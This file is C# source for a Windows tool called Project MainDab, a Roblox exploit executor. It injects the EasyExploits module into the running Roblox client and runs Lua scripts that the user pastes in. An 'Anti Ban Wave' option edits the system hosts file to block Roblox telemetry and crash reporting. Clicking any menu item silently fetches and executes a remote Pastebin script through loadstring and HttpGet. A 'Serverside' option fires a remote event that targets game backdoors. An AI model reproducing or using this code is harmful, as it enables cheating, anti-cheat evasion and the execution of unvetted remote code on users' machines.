using EasyExploits;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace ProjectMainDab
{
	public class MainDab2016 : Form
	{
		private Module m = new Module();

		private IContainer components = null;

		private RichTextBox richTextBox1;

		private Button button1;

		private MenuStrip menuStrip1;

		private ToolStripMenuItem mainDabToolStripMenuItem;

		private ToolStripMenuItem fileToolStripMenuItem;

		private ToolStripMenuItem scriptHubToolStripMenuItem;

		private ToolStripMenuItem serversideToolStripMenuItem;

		private ToolStripMenuItem aboutToolStripMenuItem;

		private ToolStripMenuItem antiBanWaveToolStripMenuItem;

		private ToolStripMenuItem execteToolStripMenuItem;

		private ToolStripMenuItem injectToolStripMenuItem;

		private ToolStripMenuItem ezHubToolStripMenuItem;

		private Button button2;

		private Button button3;

		private Button button4;

		private Label label1;

		private BackgroundWorker backgroundWorker1;

		public MainDab2016()
		{
			this.InitializeComponent();
		}

		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Project MainDab", "Made by Main_EX#3898");
		}

		private void antiBanWaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (StreamWriter streamWriter = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts")))
			{
				streamWriter.WriteLine("# Anti-Banwave Code");
				streamWriter.WriteLine("127.0.0.1 data.roblox.com");
				streamWriter.WriteLine("127.0.0.1 roblox.sp.backtrace.io");
			}
			MessageBox.Show("AntiBanWave activated!");
		}

		private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			this.m.LaunchExploit();
			this.label1.Text = "Injecting EasyExploit, please wait.";
			Thread.Sleep(5000);
			this.label1.Text = "EasyExploits injected!";
			this.label1.ForeColor = Color.LightGreen;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("RobloxPlayerBeta").Length != 0)
			{
				this.m.ExecuteScript(this.richTextBox1.Text);
			}
			else
			{
				this.label1.Text = "Please inject before executing!";
				this.label1.ForeColor = Color.Red;
			}
		}

		private void button2_Click(object sender, EventArgs e)
		{
			this.richTextBox1.Text = "";
		}

		private void button3_Click(object sender, EventArgs e)
		{
			if (Functions.openfiledialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
			{
				try
				{
					string str = File.ReadAllText(Functions.openfiledialog.FileName);
					this.richTextBox1.Text = str;
				}
				catch (Exception exception1)
				{
					Exception exception = exception1;
					MessageBox.Show(string.Concat("Error: Could not read file from disk. Original error: ", exception.Message));
					Console.WriteLine("File can't be opened");
				}
			}
		}

		private void button4_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("RobloxPlayerBeta").Length != 0)
			{
				this.backgroundWorker1.RunWorkerAsync();
			}
			else
			{
				this.label1.Text = "Roblox isn't started!";
				this.label1.ForeColor = Color.Red;
			}
		}

		protected override void Dispose(bool disposing)
		{
			if ((!disposing ? false : this.components != null))
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void execteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("RobloxPlayerBeta").Length != 0)
			{
				this.m.ExecuteScript(this.richTextBox1.Text);
			}
			else
			{
				this.label1.Text = "Please inject before executing!";
				this.label1.ForeColor = Color.Red;
			}
		}

		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainDab2016));
			this.richTextBox1 = new RichTextBox();
			this.button1 = new Button();
			this.menuStrip1 = new MenuStrip();
			this.mainDabToolStripMenuItem = new ToolStripMenuItem();
			this.aboutToolStripMenuItem = new ToolStripMenuItem();
			this.antiBanWaveToolStripMenuItem = new ToolStripMenuItem();
			this.fileToolStripMenuItem = new ToolStripMenuItem();
			this.execteToolStripMenuItem = new ToolStripMenuItem();
			this.injectToolStripMenuItem = new ToolStripMenuItem();
			this.scriptHubToolStripMenuItem = new ToolStripMenuItem();
			this.serversideToolStripMenuItem = new ToolStripMenuItem();
			this.ezHubToolStripMenuItem = new ToolStripMenuItem();
			this.button2 = new Button();
			this.button3 = new Button();
			this.button4 = new Button();
			this.label1 = new Label();
			this.backgroundWorker1 = new BackgroundWorker();
			this.menuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.richTextBox1.Location = new Point(0, 42);
			this.richTextBox1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.Size = new System.Drawing.Size(570, 295);
			this.richTextBox1.TabIndex = 0;
			this.richTextBox1.Text = "-- Paste your lua script here";
			this.richTextBox1.TextChanged += new EventHandler(this.richTextBox1_TextChanged);
			this.button1.Location = new Point(0, 343);
			this.button1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.button1.Name = "button1";
			this.button1.Size = new System.Drawing.Size(136, 51);
			this.button1.TabIndex = 1;
			this.button1.Text = "Execute";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new EventHandler(this.button1_Click);
			this.menuStrip1.GripMargin = new System.Windows.Forms.Padding(2, 2, 0, 2);
			this.menuStrip1.GripStyle = ToolStripGripStyle.Visible;
			this.menuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
			this.menuStrip1.Items.AddRange(new ToolStripItem[] { this.mainDabToolStripMenuItem, this.fileToolStripMenuItem, this.scriptHubToolStripMenuItem, this.serversideToolStripMenuItem, this.ezHubToolStripMenuItem });
			this.menuStrip1.Location = new Point(0, 0);
			this.menuStrip1.Name = "menuStrip1";
			this.menuStrip1.Size = new System.Drawing.Size(576, 32);
			this.menuStrip1.TabIndex = 2;
			this.menuStrip1.Text = "menuStrip1";
			this.menuStrip1.ItemClicked += new ToolStripItemClickedEventHandler(this.menuStrip1_ItemClicked);
			this.mainDabToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.aboutToolStripMenuItem, this.antiBanWaveToolStripMenuItem });
			this.mainDabToolStripMenuItem.Name = "mainDabToolStripMenuItem";
			this.mainDabToolStripMenuItem.Size = new System.Drawing.Size(92, 26);
			this.mainDabToolStripMenuItem.Text = "MainDab";
			this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
			this.aboutToolStripMenuItem.Size = new System.Drawing.Size(270, 34);
			this.aboutToolStripMenuItem.Text = "About";
			this.aboutToolStripMenuItem.Click += new EventHandler(this.aboutToolStripMenuItem_Click);
			this.antiBanWaveToolStripMenuItem.Name = "antiBanWaveToolStripMenuItem";
			this.antiBanWaveToolStripMenuItem.Size = new System.Drawing.Size(270, 34);
			this.antiBanWaveToolStripMenuItem.Text = "Anti Ban Wave";
			this.antiBanWaveToolStripMenuItem.Click += new EventHandler(this.antiBanWaveToolStripMenuItem_Click);
			this.fileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.execteToolStripMenuItem, this.injectToolStripMenuItem });
			this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
			this.fileToolStripMenuItem.Size = new System.Drawing.Size(51, 26);
			this.fileToolStripMenuItem.Text = "File";
			this.execteToolStripMenuItem.Name = "execteToolStripMenuItem";
			this.execteToolStripMenuItem.Size = new System.Drawing.Size(168, 34);
			this.execteToolStripMenuItem.Text = "Execute";
			this.execteToolStripMenuItem.Click += new EventHandler(this.execteToolStripMenuItem_Click);
			this.injectToolStripMenuItem.Name = "injectToolStripMenuItem";
			this.injectToolStripMenuItem.Size = new System.Drawing.Size(168, 34);
			this.injectToolStripMenuItem.Text = "Inject";
			this.injectToolStripMenuItem.Click += new EventHandler(this.injectToolStripMenuItem_Click);
			this.scriptHubToolStripMenuItem.Name = "scriptHubToolStripMenuItem";
			this.scriptHubToolStripMenuItem.Size = new System.Drawing.Size(100, 26);
			this.scriptHubToolStripMenuItem.Text = "Script Hub";
			this.scriptHubToolStripMenuItem.Click += new EventHandler(this.scriptHubToolStripMenuItem_Click);
			this.serversideToolStripMenuItem.Name = "serversideToolStripMenuItem";
			this.serversideToolStripMenuItem.Size = new System.Drawing.Size(101, 26);
			this.serversideToolStripMenuItem.Text = "Serverside";
			this.serversideToolStripMenuItem.Click += new EventHandler(this.serversideToolStripMenuItem_Click);
			this.ezHubToolStripMenuItem.Name = "ezHubToolStripMenuItem";
			this.ezHubToolStripMenuItem.Size = new System.Drawing.Size(75, 26);
			this.ezHubToolStripMenuItem.Text = "Ez Hub";
			this.button2.Location = new Point(146, 343);
			this.button2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.button2.Name = "button2";
			this.button2.Size = new System.Drawing.Size(136, 51);
			this.button2.TabIndex = 3;
			this.button2.Text = "Clear";
			this.button2.UseVisualStyleBackColor = true;
			this.button2.Click += new EventHandler(this.button2_Click);
			this.button3.Location = new Point(291, 343);
			this.button3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.button3.Name = "button3";
			this.button3.Size = new System.Drawing.Size(136, 51);
			this.button3.TabIndex = 4;
			this.button3.Text = "Open";
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new EventHandler(this.button3_Click);
			this.button4.Location = new Point(435, 343);
			this.button4.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			this.button4.Name = "button4";
			this.button4.Size = new System.Drawing.Size(136, 51);
			this.button4.TabIndex = 5;
			this.button4.Text = "Inject";
			this.button4.UseVisualStyleBackColor = true;
			this.button4.Click += new EventHandler(this.button4_Click);
			this.label1.AutoSize = true;
			this.label1.ForeColor = Color.Blue;
			this.label1.Location = new Point(8, 398);
			this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(261, 20);
			this.label1.TabIndex = 6;
			this.label1.Text = "Current Status : Awaiting Injection...";
			this.label1.Click += new EventHandler(this.label1_Click);
			this.backgroundWorker1.DoWork += new DoWorkEventHandler(this.backgroundWorker1_DoWork);
			base.AutoScaleDimensions = new SizeF(9f, 20f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(576, 422);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.button4);
			base.Controls.Add(this.button3);
			base.Controls.Add(this.button2);
			base.Controls.Add(this.button1);
			base.Controls.Add(this.richTextBox1);
			base.Controls.Add(this.menuStrip1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.Icon = (System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.MainMenuStrip = this.menuStrip1;
			base.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
			base.MaximizeBox = false;
			base.Name = "MainDab2016";
			this.Text = "Project MainDab";
			base.Load += new EventHandler(this.MainDab2016_Load);
			this.menuStrip1.ResumeLayout(false);
			this.menuStrip1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		private void injectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("RobloxPlayerBeta").Length != 0)
			{
				this.backgroundWorker1.RunWorkerAsync();
			}
			else
			{
				this.label1.Text = "Roblox isn't started!";
				this.label1.ForeColor = Color.Red;
			}
		}

		private void label1_Click(object sender, EventArgs e)
		{
		}

		private void MainDab2016_Load(object sender, EventArgs e)
		{
		}

		private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
			this.m.ExecuteScript("loadstring(game:HttpGet(('https://pastebin.com/raw/SsG8y3HA'),true))()");
		}

		private void richTextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		private void scriptHubToolStripMenuItem_Click(object sender, EventArgs e)
		{
			(new Hub1()).Show();
		}

		private void serversideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.m.ExecuteScript("game.JointsService.WeldRequest:FireServer(\"gui\")");
			MessageBox.Show("Serverside ran! If the GUI dosen't show up, make sure that you are in a serversided game! Check our discord in #serversided-games for a list of serversided games!", "Notice");
		}
	}
}